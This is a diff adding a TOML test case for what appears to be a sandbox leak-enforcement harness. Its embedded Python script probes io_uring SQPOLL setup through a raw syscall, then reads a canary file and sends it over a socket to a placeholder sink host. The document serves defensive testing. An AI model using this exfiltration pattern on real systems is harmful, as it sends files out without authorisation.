@@ -1,0 +1,34 @@
+name = "control-sqpoll-refused"
+kind = "control"
+policy = "recommended"
+
+[[files]]
+path = "payload.txt"
+contents = "{CANARY}"
+
+[[files]]
+path = "sqpoll.py"
+contents = """
+import ctypes, errno, os, socket, struct
+libc = ctypes.CDLL(None, use_errno=True)
+libc.syscall.restype = ctypes.c_long
+params = ctypes.create_string_buffer(120)
+struct.pack_into('I', params, 8, 2)
+ring = libc.syscall(425, ctypes.c_uint(8), params)
+if os.environ.get('MARSH_LEAK_ENFORCEMENT') == 'privileged':
+    assert ring == -1 and ctypes.get_errno() == errno.EPERM, (ring, ctypes.get_errno())
+if ring >= 0:
+    os.close(ring)
+payload = open('payload.txt', 'rb').read()
+s = socket.create_connection(('{SINK_HOST}', {SINK_PORT}))
+s.sendall(payload)
+s.close()
+"""
+
+[[steps]]
+run = "python3 sqpoll.py"
+# Unprivileged observation refuses a successful SQPOLL setup at publication.
+expect = "accepted-privileged"
+
+[oracle]
+encodings = ["raw"]
